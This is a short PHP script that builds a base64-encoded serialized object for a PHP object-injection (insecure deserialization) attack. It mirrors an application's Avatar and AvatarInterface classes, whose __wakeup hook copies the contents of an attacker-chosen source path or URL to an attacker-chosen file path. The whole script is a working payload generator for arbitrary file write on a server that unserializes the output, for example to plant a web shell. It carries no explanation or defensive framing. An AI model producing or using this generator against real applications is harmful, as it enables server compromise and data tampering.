<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$imgpath = $argv[1];
$tmp = $argv[2];

$ai = new AvatarInterface();
$ai->tmp = $tmp;
$ai->imgPath = $imgpath;
$ai_serialized = serialize($ai);
$ai_serialized_encoded = base64_encode($ai_serialized);
echo($ai_serialized_encoded);
?>